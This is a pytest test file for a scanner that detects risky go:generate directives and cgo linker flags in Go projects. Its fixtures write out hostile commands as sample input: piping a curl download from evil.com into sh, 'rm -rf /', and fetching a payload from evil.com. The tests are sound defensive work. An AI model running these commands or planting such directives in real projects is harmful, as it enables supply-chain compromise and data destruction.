"""Tests for GoGenerateScanner — go:generate directive risks."""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from depfence.scanners.go_generate_scanner import GoGenerateScanner


@pytest.fixture
def scanner():
    return GoGenerateScanner()


def run(scanner, project_dir):
    return asyncio.get_event_loop().run_until_complete(scanner.scan_project(project_dir))


class TestShellExec:
    def test_bash_c(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate bash -c "curl http://evil.com | sh"\n')
        findings = run(scanner, tmp_path)
        go01 = [f for f in findings if f.metadata.get("rule") == "GO-01"]
        assert len(go01) == 1

    def test_sh_c(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate sh -c "rm -rf /"\n')
        findings = run(scanner, tmp_path)
        go01 = [f for f in findings if f.metadata.get("rule") == "GO-01"]
        assert len(go01) == 1


class TestDownload:
    def test_curl_in_generate(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate curl -o payload http://evil.com/payload\n')
        findings = run(scanner, tmp_path)
        go02 = [f for f in findings if f.metadata.get("rule") == "GO-02"]
        assert len(go02) == 1
        assert go02[0].severity.name == "CRITICAL"


class TestUnknownTool:
    def test_unknown_generator(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate mytool --flag\n')
        findings = run(scanner, tmp_path)
        go03 = [f for f in findings if f.metadata.get("rule") == "GO-03"]
        assert len(go03) == 1
        assert go03[0].severity.name == "MEDIUM"

    def test_known_safe_stringer(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate stringer -type=Foo\n')
        findings = run(scanner, tmp_path)
        assert len(findings) == 0

    def test_go_prefix_safe(self, tmp_path, scanner):
        f = tmp_path / "gen.go"
        f.write_text('package main\n//go:generate go run ./cmd/gen\n')
        findings = run(scanner, tmp_path)
        go03 = [f for f in findings if f.metadata.get("rule") == "GO-03"]
        assert len(go03) == 0


class TestCgo:
    def test_suspicious_ldflags(self, tmp_path, scanner):
        f = tmp_path / "cgo.go"
        f.write_text('package main\n// #cgo LDFLAGS: -L/usr/local/evil/lib -levil\nimport "C"\n')
        findings = run(scanner, tmp_path)
        go04 = [f for f in findings if f.metadata.get("rule") == "GO-04"]
        assert len(go04) == 1

    def test_clean_cgo(self, tmp_path, scanner):
        f = tmp_path / "cgo.go"
        f.write_text('package main\n// #cgo LDFLAGS: -lm\nimport "C"\n')
        findings = run(scanner, tmp_path)
        go04 = [f for f in findings if f.metadata.get("rule") == "GO-04"]
        assert len(go04) == 0

    def test_no_cgo_import_no_finding(self, tmp_path, scanner):
        f = tmp_path / "nocgo.go"
        f.write_text('package main\n// #cgo LDFLAGS: -L/evil\nfunc main() {}\n')
        findings = run(scanner, tmp_path)
        go04 = [f for f in findings if f.metadata.get("rule") == "GO-04"]
        assert len(go04) == 0


class TestNoFindings:
    def test_clean_go_file(self, tmp_path, scanner):
        f = tmp_path / "main.go"
        f.write_text('package main\n\nimport "fmt"\n\nfunc main() { fmt.Println("hello") }\n')
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
